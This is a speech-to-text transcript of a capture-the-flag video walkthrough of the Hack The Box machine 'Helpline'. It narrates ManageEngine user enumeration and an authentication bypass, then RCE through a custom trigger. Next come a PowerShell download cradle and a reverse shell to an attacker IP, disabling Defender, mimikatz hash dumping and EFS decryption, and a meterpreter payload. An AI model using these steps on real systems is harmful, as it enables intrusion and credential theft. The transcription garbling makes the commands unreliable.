 what's going on YouTube the zipsak we doing help line from hack the box which was a relatively difficult box with multiple ways through it unfortunately Irina have time and can only show you one way that way we'll be getting our CEO managed engine landing on the server as system and then using mini cats to decrypt the encrypted filesystem for the user flag and then the administrative flag is gotten through using meterpreter or you can also do mini cats with encrypted filesystem so with that being said let's just jump in as always we start over the end map so - I see four default scripts as V enumerate versions Oh a output all formats in the end map directory and call it helpline and then the IP address which is ten ten ten one thirty two can take some time to run so I've already ran it looking at the results we have a few ports open the first thing we have is a rope cedral call on 135 and it's not too interesting SMB on port 445 and then we have a web server on port 8080 scrolling down it looks like that is it for the port requests we do have a that's not a SSL certificate that's just and Matt not knowing exactly what it is there is a clock skew of seven minutes and we have a message signing enabled but not required and that's about it so the first thing I'm gonna do is a SMB map just see if there's any shares open ten ten ten one thirty two is the host we get access to nine specify anonymous and we get access denied as well so we get any other credentials I may try it against that but for now let's just go do ten ten ten one thirty two port 8080 and we get a managed engine Service Desk plus and look at the bottom right we have nine point three which is the version and we also have a copy rate of 2019 so it probably means this application was updated recently unless this is generated dynamically meaning whenever the web page is loaded it just puts that year in if you ever see in a copyright of like 2014 you know there's probably going to be something there because it's so out of date but if you see the current year you can't really confirm it's out of date but you can't come it's up-to-date because it could be a few months out of date and additionally this could just be dynamically generated so the first thing I'm going to do is just let's check out search Boyd manage engine service desk and we see a whole slew of things so we can just ignore all these like eight to nine dot 2's because we know that application is 9.3 so we have privilege escalation generally this needs an account so I'm not going to check this out we do have user enumeration and if you looked at this it's a bit wordy so I'm not going to read it instead we'll just go and reproduce it so going over to Firefox go to foxy proxy set it to intercept that's on default there we go click login with admin and then put a password of anything I'm putting please subscribe make sure web suite proxy is on intercept click login and we get this so with sending a post request to admin please subscribe that's not the first personal quest I think I accidentally hit enter here and that's why I saw something there so let's click login again and see what it sends or I can just go to this history so this is the very first request it searches this and then it sends a request to Jay Security check with the actual password but we just sent this to repeater we see it during a search against local off domain put the timestamp and then the username users know if we do like administrator we get a non a domain so if you wanted to you could now just copy this and send this over to W fuzz to enumerate other users so you could do like W fuzz - W for list users share cyclists usernames or top username short list - you for URL HTTP 10 10 10 1:32 80 80 and then paste and then search equals capital floods and we're probably to put this in single quotes and we can see right off the bat that there's two that has 13 characters or three words guest or administrator additionally if you went into Google and just Google like manage engine service desk default username you'll probably see the default username is administrator there we go default set of credentials administrator administrator so that's gonna be the first thing I try so let's turn intercept back off go to Firefox try administrator administrator tell this to never save and this application is relatively slow so this may be choppy as I speed it up so administrator didn't work but looking at the wfos results we also had a guest account so I'll try guest guest try to log in and we get in so now the way we should do this box of the antenna solution is going over into the solutions tab and then you'll look at this help desk and see down here we have Luis Rubio an administrator and just looking at the help desk created by Luis there's the ones I think created by the Box creator we see some things so there's one that just said make a bank oh right here so I think this is a ticket you should read we can look at this but going all the way down we do have a password audit if you go here you can download the results and then there's a hidden sheet in this document that just has some credentials unfortunately it is late in the afternoon on Friday and this video has to go live tomorrow so I can't show you all the solutions this ticket is just saying open remote access Meghan Bank calm and Ana credentials but if you remembered going back to the search point let's just type it again managed engine service desk there was a privilege escalation one so we'll check this out so search point dash X view it anyways and we see this is just a Python script so I'm going to do search point - m2 mirror and then we'll open this up in them to see the script so this is a Python script and going through it it's pretty her jury it's not documenting too well and it's doing HTTP requests a bit weird creating the curl command manually and then executing via P open so let's see if we can find any information on this so I'm going to grab the CVE out of this and we're just gonna go to Google and figure it out so if we google the CVE there is a github page and scrolling down looks like there's more info at this URL going here though returns a 404 so I'm gonna go to archive.org and we're going to search to see if we have that in here was I supposed to do the search up top here the wayback machine and it doesn't seem to have the page archived so we're gonna try it another way to pull old pages go to Google type cache colon and then the URL and we can get to this so it's not that of documentation you get the page and gives you a J session token' get a home page go to MC which is the mobile console and it gives you a third J session ID you log out and then it gets the page again and you send it different cookies and since you have one authenticated cookie it just magically authenticates you with no password so let's try stepping through that and maybe it'll make more sense this is a exploit I don't fully understand why it works but I'm guessing it's just one of the cookies is resolving to an all user so let's just step through this and send the exploit through rip so cherry tree I'm sure there's probably hotkeys to tile my window with four windows but we'll do it manually so the very first thing we're gonna have to do is get the Python script to go through a proxy and since that's using curl I'm just going to edit my dot curl or a C file on my home directory put proxy equals HTTP one 27001 colon 8080 so now if I do curl ten ten ten one thirty two eighty eighty turn intercept on click go we see it sends a request so let's now run the oh boy we're on the exploit we have to change localhost to be an IP address so ten ten foot ten ten ten one thirty two the IP of HopeLine and now we should be able to run the exploit non ASCII character on line five go to line five it looks like it's this character so we're just there's a few we're just delete the line and then if we go to run the script with burp on we will see the intercepted request the very first thing we do is we do get slash which is right here and I forgot one last thing let's make sure we have intercept server request on I just clicked on options there and then now when we click forward we can see the response of it saying set a header cookie so J session ID zero is most likely this guy so let's just put this and document initial slash request and we can afford this along and now we're doing a post on J security check with this J session ID and the username guest guest so click forward and it returns us a cookie again I know we're doing a get request on slash so we posted here doesn't send us anything we send another request to slash and this is when it should respond with our J session single sign-on cookie accordingly to this so I can just put J session SS whoops SSO which is important so we can grab this and then it also sent a another J session ID this one's unique there's probably authenticated to guest guest click forward and that says capture an authenticated cookie one D 8 and 0 C so we just log those this is the guest guest authenticated and that's single sign-on and now we're doing a get request to slash MC which is their mobile console and it is telling us it's moved and gave us a nother Jace cookie so this is probably guess to /mc and in their documentation this is a session to so click forward now we're doing the magic step one so we're sending to J session IDs along with or a single sign-on so the single sign-on is going to be static the whole time but we're sending it the guests to /mc plus our initial authenticated to the non-mobile console click forward it tells us ok now we're going to get the dashboard and again doing the same two cookies click forward and now it's going to return us new cookies the single sign-on doesn't look like it changed but we get a new one so this is MC after logout and we are right here and their documentation J session 3 so we're doing a get slash with 5e D which is the previous guest 2 / MC and then one D which is our initial authenticated to guest guest and then the single sign-on and it's going to respond back with yet another one this is from slash so now the application is probably going to try to login since this J security check is a login page so we do here with making a post request to J security check and sending it the J session ID from the mobile console and / with administrator and a password we can put up anything so we can put please subscribe I'm and click forward it will return us J session ID number 5 which will be authenticated and if you don't understand what's going on I don't either I have no idea my guess is I've got to copy it down but my guest is when you visit slash it just gives you a generic J session this one doesn't matter so we can get rid of that so whoops we need to put H here click forward so when we authenticate to guest guest we got this token that says were authenticated and we're going to J session single sign-on then we're going to make a request over to the mobile console we get yet a another token when we do this logout I'm guessing it knows out authenticating to guest guest at slash but this token remains logged in in order to do a login though you need a cookie from the root so we just go here get this which is an authenticated one and then we make a final post request with a cookie that says worth any kated so this cookie says authenticated no user info then this cookie has no user info and then the J session single sign-on I don't know if this has cares but it says authenticated and then no user info so the application sees this on a login and when we try to log in with the administrator user it goes oh you are authenticated so I'm just going to let you in and now that becomes your magic cookie so hopefully that's how it works you can dig more into that but it seems to be pretty complicated with how little it's documented and without the source code to manage engine of course we could just go pull it and analyze it but that's a lot of work so it just wants us to replace our cookies so if we go over here into authenticated session I'm gonna hit all tools web developer and we're gonna go to network and then click storage and we can just replace our cookies here so the very first one we don't want to edit this slash custom one I don't think we have to at all but we're gonna grab this J session copy go here paste and then the single sign-on one is up here so we just copy this actually before I do that I'm gonna refresh the page so a guest - single sign-on matter so I just refreshed and we are still guests so I think single sign-on does matter so I'm going to put this cookie there and I'm also going to look make sure we have this cookie and if this doesn't work we'll just read on the exploit again because that would mean by testing that thing out I had like killed my cookie so then doesn't really kill my cookie because now the page has changed and I have a link to admin so with this like most like helpdesk applications there's plenty of ways to get code execution I'm just gonna click on the admin tab do custom triggers and then we can set up a trigger and it looks like there's one already here so I'm gonna go revert the box so we have a clean work area so the box has been reverted so we don't have a custom trigger we can add one and then we want the action name and the first one we're just going to use ping because all we want to do is test this out so we can see the action will be executed when a request is created and then for the match below criteria will say when the sender is not please subscribe if I can type correctly and this is just going to always match because we're never gonna put the sender as please subscribe then we can do execute the script CM d /c ping 10 10 14 and 3 we also want to specify - and one for count and before we ping we want to do TCP dump - I ton zero ICMP so we can save the script then open a request and create a new request so we can do new incident and we can do the name ping and the subject Oh RCE test and then add the request and if you are doing this on an actual engagement chances are you would probably change this to be instead of one crest request is created maybe do edit will find a different path and manage engine that's not so noisy because you're not going to want to create a request for every time you execute code we see that as finished going back to a window we can see 10 10 10 31 32 has pinged us so now to test actual like code execution and running PowerShell so I'm going to make dirt dub-dub-dub and then we're going to copy opt nishang shells then powershell invoke powershell tcp ps1 and we'll just call it shell ps1 and then edit this we want to grab the reverse shell and then we will do the IP address of 10 10 14 3 and the port of 9001 so let's listen on 9001 and also start a web server simple HTTP server ad and then one other thing I always like doing when dealing with web applications is minimizing the types of characters I send it so I'm going to do echo IX new object net web client download string HTTP 10 10 14 3 /l ps1 do this in double quotes here okay and then to get this in a pouch format that PowerShell once we have to convert this to format utf-16 little-endian and if we do xxd now we can just see what it looks like if we got rid of the I convert we can see what it looks like so Windows likes things looking like this at least PowerShell does so base64 - w0 and I'm also gonna do - n because we don't need that carriage return at the end so we can copy this command I'm just gonna eyeball this real quick ix new object net web client download string yep that looks good I want to make sure I copy both of those equals go to Firefox and let's edit this to be shell and then we can try CM d /c powershell - NOP for no profile - Ian C 4 encoded command and then paste the base64 save and then if we do request new incident we can put the name as powershell and the subject as Oh Reb shell and then add the new request it'll probably take a good 45 60 seconds because the applications relatively slow for that to give it through but we should see a get request on port 80 and then a shell return and I realized I made a mistake when I was showing this off we had this xxd in here still we don't want to have that and the basic Steve will come in is much smaller so let's try this one so copy this go here edit this and the encoded command paste save and then we can do request new incident and we can do Rev - you can say second attempt red shell add the request okay so hopefully now in 45 seconds we get a call back there we go called back on 80 and we have a shell if we do Who am I we see we are an anti Authority system so if we went to see : went to users administrator desktop and then tried to get root DX T we will see oh we can but if we type it we get an error message the access to path is denied so there's definitely an issue with that if we do Seifer slash C root txt we can see only the user that can decrypt it is helpline slash administrator so this is using encrypted filesystem which is built in encryption windows and we can also go up to directories do GC I forget child item recurse dot and select full name if I can spell GC i recurse dot select full name and we can search for like user dot txt see that's in CD backslash users Tolu desktop do dir and try typing this user dot txt we get an issue so we can do cipher /c user dot txt and see only helpline can decrypt it so what we have to do is use mimic ATS to build a certificate so we can view this or switch to the total user so if we did task list maybe task list /v and then just went up whoops go up we can see process baillio nothing by total so we can't just go into toll lose process space and execute it the other thing we can't do is decrypt this with ntlm hash because the machine is not domain joined on encrypted file systems on the domain join machine you should be able to use the ntlm hash as a secret but if it's not the main joined you stuck with only using the sha sum or the actual plaintext password the reason for that is Microsoft doesn't want to put the password for encrypted filesystem in the Sam database and ntlm hashes for domain users are not in the local Sam database of the machine so with all that being said what kind of stuck because we have to find a way to get the plaintext password of total ooh and since we're doing the box in an unintended route we kind of miss hints so what I'm going to do is go back into E and which is going to drop mini cats and do cracking NT lan passwords because that's something that you should always be doing so if we just go to mini cats github and then go to releases we can download the latest one maybe cats trunk save and then go into dub dub dub move downloads mini cats here 7-zip extract mini cats and then move x64 mini cats exe and if we invoke web request - URI HTTP 10 10 14 3 mini cats dot exe - out file mini cats dot exe see if we can download it so we see a webserver it started downloading and are we gonna get a show back is it's still going I'm going to try typing Who am I see if we get any response back we don't so either server's going slow or something just killed our process so it's probably been about a minute now so I'm just gonna name this window temp go into 2 and we're going to do NCL VMP 9001 and get another shell in this box so we can just create a new incident so new incident just give it junk add request and get another shell on this box and with this shell I'm going to disable Windows Defender maybe that stopped it and when it killed the download maybe it also killed my shell without telling me oh we finally got a response back if I do Who am I looks like everything is good I do dir we got mini cats there I'm going to try to execute it and we'll do exit right after it failed to run because the file contains a virus unwanted software so going to disable defender or we could just produce a mini cats that defender doesn't do there's a video on my channel but for this video we'll just disable defender instead of bypassing it so now if I do dot slash mini cats Exe exit it should run and then stop it I'm also going to do tasks list slash V here because this box has started going slow okay so there we go so we can do mini cats dot exe token elevate then we need LS a dump Sam and then it's always good to put an exit at the end so this will give us the ntlm hashes of all the users and it looks like we're probably missing one up here which is the administrator so I'm going to grab all this output V ntlm paste and then we want to grep ntlm on this file and then I'll print and that's one two three three spaces and we have all the hashes so I'm just gonna go into my cracking rig you could just search this on hashes org and potentially do that actually let's do it that way Ash's dog instead of using hash cat hash I think it's search would check nope Rydia and then TT QV y and z submit we got one cracked and it's ef-2 eight five so if we go back and look at this EEF that is the Zachery user so we got Zacks password so what I'm going to do is net user Zachary and see what he can do he is a member of the event log readers group so maybe we're supposed to be looking into the event log and the best way to process that is the github page I think rambling Cookie Monster there we go and there's some good PowerShell event log stuff in here so if we do get - event or was it event data is this the only one let's see now we want win event and event data so copy this shoot ctrl shift V did not copy and I'll think three CDW Bob the event dot PS one set mode to paste we can paste that in and then let's also get win event get win event data and we want I want to get - win event is just a default PowerShell see no events match so okay that's default PowerShell so we can just do IX new object net dot web client download string HTTP 10 10 14 3 and then we called it event ps1 ok so now we should have get - win event data so we'll do get - when event go to a hash table hat log name security and then how else does he do this I'm getting it from go to hash here so he's doing 47 40 which I believe is lockout events on domain controller and that's not going to be what we want so if we do like Windows Event Code 47 40 I'm just trying to find the URL ultimate Windows security I'm going to search this one specifically for command line process logging and let's see we want to do I think 46 88 is it a new process has been created so you can just search through the win a vent log you could do a command to export the moth or a file and then do it manually but there should be ones you just know to search for and do it that way so we're searching for event ID 46 88 and we can say get when event data and we should have put this to a variable so let's copy this and X is equal to that and that's going to fail because I don't have the a on that so X is equal to that and now that that's done we can look at X it's not printing anything let's do X dot F T like that right host X so it looks like something screwed up with my standard and standard out I believe so let's do let's try this - is there a max max events events one get one of that data I'll just type it and we'll do format list star so we can see all the things here and we have let's see we wanted command line so there's a variable e underscore command-line so let's do this again right between new window because I don't want this new line so copy paste we want get - when event data and then we want select e underscore or do ft e underscore command or is it I'm just going to type it out again we want command line he underscore command line it not being in the X variables really screwing me up and I think that's purely because of nishang so I'm going to type it out in cherry tree okay so what we want 46 46 88 here you don't want max events and we want F select will probably fine e is it just command line was it process command line just command line so let's try this command get win event we don't want computer name and we don't want that ten because that was from max events paste and we're getting a bunch of things but it looks like they are truncated so I'll do I think format T table - auto size and - rap here we go so we can look at all this command line logging on the windows box and eventually we will find a net dot exe help desk user Tolu and here's a password so we could quickly validate the password with SMB map - you tol you Espie the password - h 10-10-10 132 and we see it is a valid user there is a help desk that's directory actually don't know it's in that we can do recurse to see what's in it a stats xml but with that password now we can use mini cats to decrypt the EFS so let's just do that so I can't clear so let's do Google mini cats decrypt EFS and let's put Toulouse password here so how to decrypt EFS files so the first thing we want to do is that cipher command so we can do cipher backslash c c colon users total Lu desktop user txt and we can see the certificate thumbprint is this so go to Cherrytree DFS I'll just do new thing DFS Tolu user dot txt thumbprint is this so that's gonna be important because this tells us what certificate can decrypt it so if we go back into here see he wants us to grab the app data roaming Microsoft systems tickets my certificates and then this piece I believe is the thumbprint so let's go see : CD dot dot so Y in C colon users totally go an app data roaming and then we want Microsoft certificates this seedy this PWD okay so go back to eewan mimikatz is dot slash mimikatz dot exe we want to do I think sect URL si Kathy is this the first one a cryptosystem so we'll do crypto system and then space slash file specify this and I forgot to do a dir on that it should be fine we can do it here and our other shell so dir SC : how do you add the C there C : CD users Tolu app data roaming Microsoft System certificates CD my CD certificates and then this and you'll notice this one is the same as the thumbprint so 9 1 EF ends with 29 so was it certificates or certificate certificates put that there and that go back to firefox to look at the command cryptosystem file and we need / export and then we want exit let's not recommend the name yeah yeah let's up Mimi Katz was here let's download it again your ride ten ten fourteen three slash maybe cats dot exe - out file Mimi cats dot exe maybe something periodically cleans this out and I don't think that's gonna copy correctly that looks like it did there we go so we saved it to dot d er so if we do dir we have this file and we want to copy this file to a box so I'm going to do SMB server if you don't have that you probably have like in packet - SMB server we can do - SMB to support - user test - password test those are just made up and then the share name we'll call it test and the location PWD before I do that make der SMB and then we can do this okay it has now started so we can net use Z : 10 10 14 3 slash test slash user test and then type the password is test now we should be able to copy this file to Z : and if we go into SMB we have the file so the next file it wants us to grab following these instructions is the private key so we can do deep a P master key and this one is in the protect folder and this is the state of the user so if we go back to this CD protect dir CD the CID and then if we do GCI - hidden we can get this thing so we can copy this go back to Jerry tree we'll do that slash this okay and the command we want to run is Dee Pappy master key so paste / in I don't like that it's a different color deep Appy master key and there's no special characters there so I'm not going to quote that the next thing we want is / password so / password and then to lose password was up here we grab this paste and then do exit blessing when do is get rid of that if you have noticed the quotation mark keeps doing some type of weird encoding that I don't want there we go it turns like into slanted quotation marks if that makes sense we need dot slash mini cats dot exe was it just slash in I think there's a file / in we do this correctly which we did not let's see maybe cats deep happy master key so we want to put that in this quote there we go see if this works there we go and maybe cats is weird like this is a command and then these are arguments to the command if that quote is outside then it registers this as a command and then this is a command so every command you want to put you want to put it in quotes so that's what I'm doing and we have the master key extracted so we can go up here master key here so if we go down it now wants us to grab something out of the RSA directory so we can go into the RSA what is it Microsoft crypto RSA crypto RSA go into the S ID and then wants to scrap this file so we'll just copy star - wait wait doing anything gets this file I think we are yeah let me just copy this whole command paste so we'll do be Pappy capi and C colon go back here wait a gutsy : so copy this and then backslash we want the next piece which is this okay and then it once / mastered key and we paste that over here okay put this all in quotes dot / mini Katz dot exe and hope this is all good we want to do it and this one would have made me cats run this and I think we have an error I'm looking at slash in : / C and I don't have exit so you can see our mini cats is hung we should be able to go task list / v fine string mini and then task list / kill / I am mini cats dot exe maybe that'll work task lists task kill / IM mini cats dot exe task kill / IM mim e cats dot exe task kill / for force mini cats dot exe there we go Pross hasn't been terminated and now it's spamming standard out there we go so let's go back here so now you know what happens if you forget the exit and we want to get rid of let's see-oh /ok paste there we go you can see how quick it ran and it gave us a new file this raw exchange so we can copy this to Z copy this to Z colon backslash there we go and if we look in our SMB directory we have those two files so going back here it'll give us open SSL commands so it does open SSL x.509 inform dirt out for EM and then we do - out public p.m. so nine one - out public p.m. then the next one with this raw and then there's a Barbie - out private top M yep so now we got public and private and we need to create a key and the password says mini cats here and cert is X okay and now it says you can install it with you till - user - P mini cats input pfx cert pfx no chain no root so let's try this go here go into Z paste completed successfully so now if we go into Tolu desktop and do I think this at work file is equal to GC forget content user dot txt I'm just trying not to show the flag so let's do that and then file dot substring 0 to 615 will be fine there we go the first 15 characters of the flag here we could definitely read that file now after importing the certificate so now the next thing to do is get the administrative flag so we have to get the administrator password first and if we looked back at all the files that were there there is a unique file in Leo we go to Leo desktop and that is admin pass but it is also protected by cipher so we have to be able to get Leo's encryption key to be able to decrypt this the easiest way to do this because when we ran task list /v we see Leo is actually logged into the box so we just have to get into a session and then we can decrypt it so what we're going to do is go run MSF venom - p4 payload windows 64-bit reverse TCP meterpreter reverse TCP L host 10 10 14 3 L port 9001 format Exe out file MSF dot exe and then we just draw an MSF DB run and this will give us the MSF console window we can do file MSF dot exe it's good use exploit multi handler set payload Windows x64 meterpreter reverse TCP set L host tun 0 set L port 9000 1 run and go back over here z : dot slash MSF dot exe to execute it and then probably in 10 to 15 seconds we'll see a call back and stood sending stage 2 or stage 1 there we go we took the session 1 has been opened let me just do sessions - I won oh I'm ready in it so PS and let's look for explore just because that's generally a stable process running as leo so let's actually do this first so we do shell C : CD users leo desktop tight where's the file type admin paths ml access is denied migrate into the pit shell CD users Leo desktop type admin - passed XML and we can see we can read it now and this is the output of a secure string and PowerShell so what I'm going to do is load PowerShell so now we're meterpreter extension can just execute power shell undo PowerShell shell and we're going to go into that location what do P W is equal to get content admin - pass xml convert to secure string we do PW we see its system dot security secure string so I can do credential is equal to new object system management automation PS credential administrator and then the password which is the variable and if we do cred get Network credential we can see that and the password is actually just a hidden variable so if we do ft4 format list star just like we did before we can see the administrators password so if we do Cherrytree go here administrator that and if we wanted to we could do the whole encrypted filesystem thing again to get this or we can just do this with invoke command because if we do invoke command computer name helpline - credential cred - script block Who am I we'll see that it's actually running as administrator and this user can automatically decrypt that file so if we do the same thing script block file is equal to GC C colon users administrator desktop root text and we want to do file dot substring 0:15 will see that it actually errors out we don't have access to it so the reason is whenever we do like powershell remoting you have that double hop problem unless you use credit P so we can do whoops I don't want to copy the line break there we go - authentication credit SSP try this let's see unexpected token it's weird I wonder if it copy like HTML and we have a bad character somewhere try create SSP here and vocal command lease is taking longer maybe it wants script block to be the very last thing there we go the first 15 or 16 characters of the hash for administrator so that is the box if you guys want to challenge yourself I'd recommend doing the ef-s thing to decrypt the file with the administrator password but that would be it I hope you guys enjoyed the Box take care see you all next week